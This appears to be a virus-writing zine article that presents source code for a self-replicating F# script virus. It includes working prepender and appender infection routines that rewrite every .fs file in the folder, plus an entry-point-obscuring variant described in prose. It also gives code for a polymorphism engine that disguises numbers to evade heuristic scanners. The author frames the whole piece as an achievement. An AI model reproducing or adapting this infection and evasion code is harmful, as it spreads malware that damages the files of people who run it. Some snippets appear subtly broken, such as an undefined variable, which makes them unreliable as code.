     In 2004/2005 Microsoft has started a new field of researching - with an
     interesting idea: Combining a functional language with the .NET Framework.
     The result of the research is a language called F# - a .NET variant of ML
     with a core language similar to that of the OCaml programming language.
     Usual languages like this (Calm, maybe LISP) are only useful for research
     purpose, but Microsoft wants to change this additude.
       I found the language first in an article of iX special 1/2006 called
     "Ein neuer Halbton" by Oliver Mueller [I've got the magazine by my boss for
     learning to use .NET with SQL 2005 - but well...). I was fascinated by the
     idea and wanted to write a virus for it - didn't know what will happen. I've
     tried it several times - without success - the language was just too strange.
     Then one weekend I said to myself "I DO IT NOW" - so I've used ~30 of non-stop
     researching, learning, reading, testing, coding... The problem is, that F#'s
     documentation is very poor and that the interpreter's Error Messages are very
     useless ("virus.fs(2,0): error: syntax error"), and the interpreter has still
     some very strange bugs. After I had nearly a nervous breakdown (no shit -
     imagine 30 hours of successless researching, repeated Gorillaz music, coffee,
     a few beer and much cigaretts), I found some secrets, and was able to write
     the world's first computer virus in F#. That was definitivly one of the great
     moments, which you don't forget soon.

       You can get F# here: http://research.microsoft.com/projects/ilx/fsharp.aspx

     OK - enough about this strange story - see my researches now...





  1) File infection

     a) Prepender

        Finally, after ~ 30 hours and 2,5 packs of cigaretts, the first F# virus
        infected its victim. The code simply searchs for victims (*.fs files in
        the current directory), checks if the victim is already infected, if not
        it copies its own code before the victim code. For finding its own code,
        it uses the 'Sys.argv.(1)' method. '.fs'-scripts will be opened this way:
        'fsi filename.fs'. The method returns the second argument given in the
        command line expression, which is the virus-filename. Now see the code...

open System.IO
let vfile = new StreamReader(Sys.argv.(1));;
let vcode = (vfile.ReadToEnd()).Substring(0,526);;
let vclose = vfile.Close();;
let files = Directory.GetFiles(".","*.fs");;

for i = 0 to files.Length-1 do
  let hfile = new StreamReader(files.(i)) in
  let hcode = hfile.ReadToEnd() in
  let _ = hfile.Close() in
  if (hcode.Substring(3,9)<>"Archangel") then begin
    let hfile = new StreamWriter(files.(i)) in
    let _ = hfile.Write(vcode+hcode) in
    hfile.Close();
  end

        - First it opens the 'System.IO' namespace, so we don't have to write that
          expression again.
        - Then it opens and reads its own code.
        - Searchs for all f-sharp files in current directory
        - Reads the code of the victim
        - Checks if already infected
        - If not: INFECT!
        - Note: The empty last line is important!





     b) Appender

        The next infection type, as usual, is appending the code at the end of
        of the file. There are just a view changes. Look at the code and you
        will see:

let vall = vfile.ReadToEnd();;
let vcode = vall.Substring(vall.Length-576,576);;
vfile.Close();;
let files = Directory.GetFiles(".","*.fs");;
for i = 0 to files.Length-1 do
  let hfile = new StreamReader(files.(i)) in
  let hcode = hfile.ReadToEnd() in
  let _ = hfile.Close() in
  if (hcode.Substring(3,9)<>"Archangel") then begin
    let hfile = new StreamWriter(files.(i)) in
    let _ = hfile.WriteLine("(* Archangel *)") in
    let _ = hfile.Write(hcode+vcode) in
    hfile.Close();
  end

        - It prepares the infection: Includes 'System.IO', reads its own code, ect
        - Searchs for any f-sharp files in the directory
        - Reads the code and checks if it's already infected
        - If not infected, open it for writing
        - Write the infection marker at the start
        - Then write the host code and, in the end, the virus code





     c) Entry Point Obscuring

        As usual, I present you as third infection type "Entry Point Obscuring".
        This code first searchs a valueable place for infection, and writes its
        own code to that position. At complex files this code fails, as it just
        searchs for 0x0A+0x0D. But nevertheless, this all is prove-of-concept.
        At this code you can see the strange world of functionality for the first
        time (no direct counters, for-loops and if-statements as functions ect).
        For deeper explanation of the code, see the end.

         --> First it searchs it's own code by the .NET String Methode IndexOf.
         --> It searchs for infectable files in the current directory.
         --> It searchs for valueable places to infect in the victim file.
         --> It gets a random place using .NET class System.Random() - method Next
         --> It finds the random place again and includes the virus code there





  2) Polymorphism

     a) Number Changing

        This script polymorphism technique could be very useful against simple
        heuristic attacks. It changes a number in the code by chance ~33.3%.
        The new calculation is a representation of the number - like:

        1 = ((2/(0+1))-((3-1)-(1/1)))

        It uses arichmetic operation ADD, SUB and MUL. It can not use DIV, because
        the numbers represent integer, not float.

        There have been several difficulties while writing the code, like you can
        not change the counter of a for-loop (at least I didn't find a way). But
        as I could solve any problem, you can see the code now:

let vcode=vfile.ReadToEnd();;

let vf=new StreamWriter(Sys.argv.(1));;
let changeval=ref false;;
let newcode=ref"";;
let nstr=ref"";;
let c=ref 0;;
let l=ref 0;;
let r=ref 0;;
let s=ref "";;
let rand=new System.Random();;
let istrue num=if num=0 then false else true;;
let isint num=if (num>="0"&&num<="9") then true else false;;
let makedif num =

  let rr=rand.Next(3) in
  if rr=0 then begin
    r:=num-rn;
    s:="+";
  end;
  if rr=1 then begin
    r:=num+rn;
    s:="-";
  end;
  if rr=2 then begin
    r:=num*rn;
    s:="/";
  end;
  "("^System.Convert.ToString(!r)^ !s^System.Convert.ToString(rn)^")";;
for i=0 to vcode.Length-1 do
  l:=1;
  changeval:=false;
  if (!c<vcode.Length) then begin
    nstr:=vcode.Substring(!c,1);
    if (isint(!nstr)) then begin
      nstr:="";
      while (isint(vcode.Substring(!c,1))) do
        nstr:=!nstr^vcode.Substring(!c,1);
        c:=!c+1;
        l:=!l+1;
      done;
      c:=!c-1;
      if (vcode.Substring(!c-6,5)<>"ToInt"&&vcode.Substring(!c-1,1)<>"\u0022"&& !nstr<>"0022"&&rand.Next(3)<>0) then begin
        changeval:=true;
      end;
    end;
  end;
  if (!c)<vcode.Length then begin
    if !changeval then
      newcode:=!newcode^makedif(System.Convert.ToInt32(!nstr))
    else
      newcode:=!newcode^ !nstr
  end;
  c:=!c+1;
done;
vf.Write(!newcode);;
vf.Close();;

         --> First it searchs its own code.
         --> It prepares all variables
         --> It creates two sub-functions, for checking if a string is a number and
             for create the representating calculation of a number
         --> It goes throu the code and searchs all integer numbers
         --> If the number is not part of "ToInt32"-method, if it is not '"', if
             it is not a unicode and if rand.Next(3) is not zero, it changes the number
         --> It writes the new code to the file.





     b) Space Games

        This kind of polymorphism uses the fact, that F# ignores multible spaces.
        That means a command like this one:

          let a = ref 0;;

        is the same as 
          let   a     =   ref   0;;

        The code randomly adds and removes spaces from the code. It is quite simple,
        but again you can easiely see the princip of functionality (in function istrue).

  3) Outro Words

     Another file extention has been added to my "List Of Victims" - and especially
     about this one I'm really really happy. I proved myself that I can do everything
     I want. I'm also very happy that I can stop working with that language now -
     to be honest, I hate it - I nearly got crazy when I coded in that language,
     without success first (and not that usual 'crazy' - but the real crazy).
     Well, I will never do anything related to that language - trust me ;)
